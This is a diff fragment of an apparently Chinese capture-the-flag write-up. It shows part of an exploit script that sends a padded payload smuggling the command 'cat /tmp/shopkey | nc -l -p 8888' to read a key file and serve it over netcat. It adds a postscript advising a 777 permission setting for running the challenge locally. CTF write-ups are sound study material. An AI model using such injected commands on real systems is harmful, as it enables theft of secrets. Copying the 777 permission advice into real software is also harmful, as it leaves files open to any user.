@@ -46,3 +46,5 @@ payload = RIGHT_PAD('\xff' * 20 + '\ncat /tmp/shopkey | nc -l -p 8888\n', LEN_TO
 io.sendall(l32(len(payload)))
 io.sendall(payload)
 ```
+
+PS：这题如果要本地跑的话，需要新建目录`/home/wangyanfeng/shopinfo`，同时设置好权限，直接777最简单。
